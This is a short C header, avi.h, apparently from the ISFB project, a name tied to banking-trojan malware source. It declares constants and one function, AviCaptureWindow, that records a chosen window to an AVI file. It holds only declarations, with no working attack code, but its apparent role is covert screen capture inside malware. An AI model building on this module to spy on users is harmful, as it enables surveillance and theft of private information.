//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: avi.h
// $Revision: 450 $
// $Date: 2015-01-15 20:41:15 +0300 (Чт, 15 янв 2015) $
// description:
//	Screen capture into AVI video file.

#define	AVI_DEFAULT_RATE		10		// frames per second
#define	AVI_DEFAULT_QUALITY		5000
#define	AVI_DEFAULT_COLORS		16		// bits per pixel


//
//	Captures video stream from the specified window and saves it into the specified file.
//
WINERROR AviCaptureWindow(
	LPWSTR	pFilePath,	// file path to write captured video
	HWND	hWnd,		// handle to a window to capture video from
	ULONG	Length		// length of the video in seconds
	);
